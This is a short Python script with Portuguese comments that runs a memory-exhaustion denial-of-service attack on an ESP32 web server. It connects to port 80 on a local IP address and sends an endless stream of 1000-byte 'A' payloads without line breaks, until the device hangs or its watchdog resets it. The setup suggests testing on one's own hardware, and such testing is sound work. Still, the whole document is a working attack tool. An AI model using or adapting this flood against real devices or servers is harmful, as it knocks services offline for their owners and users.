import socket
import time

# Substitua pelo IP que aparecer no Monitor Serial do Esp
IP_ALVO = "10.207.245.224" 
PORTA = 80

print(f"Iniciando ataque de exaustão de memória em {IP_ALVO}...")

try:
    # Cria o socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP_ALVO, PORTA))
    
    # Envia lixo continuamente sem pular linha (\n)
    payload = b"A" * 1000 # 1000 caracteres por pacote
    
    contador_bytes = 0
    while True:
        s.send(payload)
        contador_bytes += 1000
        print(f"Enviados {contador_bytes/1024:.2f} KB...", end="\r")
        # Pequena pausa para não engasgar a rede do PC, mas encher o ESP32
        time.sleep(0.01) 
        
except Exception as e:
    print(f"\nConexão caiu! O ESP32 provavelmente travou ou reiniciou via Watchdog.")
    print(f"Erro: {e}")